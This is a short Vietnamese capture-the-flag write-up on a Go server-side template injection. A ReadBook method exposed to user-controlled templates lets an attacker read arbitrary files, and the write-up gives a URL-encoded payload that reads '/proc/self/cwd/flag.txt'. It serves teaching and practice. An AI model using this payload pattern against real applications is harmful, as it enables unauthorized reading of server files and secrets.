Khi ta đọc source code của bài này, ta thấy :

<img width="960" height="446" alt="image" src="https://github.com/user-attachments/assets/cff1cbec-8759-4e44-a9a3-3c89df5133fc" />


```html
tmpl, err := template.New("book").Parse(userBook)
tmpl.Execute(w, ReadBook{})
```

- `userBook` là tham số từ URL `?book=...`.
- `tmpl.Execute(w, ReadBook{})` truyền một object **ReadBook** vào template.
- Struct `ReadBook` có method:

```html
func (rb ReadBook) ReadBook(filePath string) string {
    content, err := os.ReadFile(filePath)
    ...
}
```

Nghĩa là nếu trong template bạn gọi {{ .ReadBook "/path" }} → server sẽ đọc file /path và trả nội dung.

Kết luận: Đây là **Server-Side Template Injection (SSTI)** → có thể đọc file tùy ý (Local File Read).
Vậy ta sẽ chèn payload vào url như sau: 

```html
/books?book=%7B%7B.ReadBook%20"%2Fproc%2Fself%2Fcwd%2Fflag.txt"%7D%7D
```

<img width="1246" height="150" alt="image" src="https://github.com/user-attachments/assets/30bdfc32-5f76-4f6e-affb-72981363a6b7" />
